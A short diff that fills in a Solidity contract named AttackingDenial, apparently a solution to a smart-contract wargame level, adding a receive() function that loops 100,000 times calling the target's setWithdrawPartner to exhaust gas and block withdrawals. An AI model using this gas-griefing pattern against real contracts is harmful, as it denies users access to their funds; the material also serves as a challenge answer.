@@ -10,4 +10,9 @@ contract AttackingDenial {
     }
 
     //Code me!
+    receive() external payable {
+        for (uint256 i = 0; i < 100000; i++) {
+            Denial(contractAddress).setWithdrawPartner(address(this));
+        }
+    }
 }
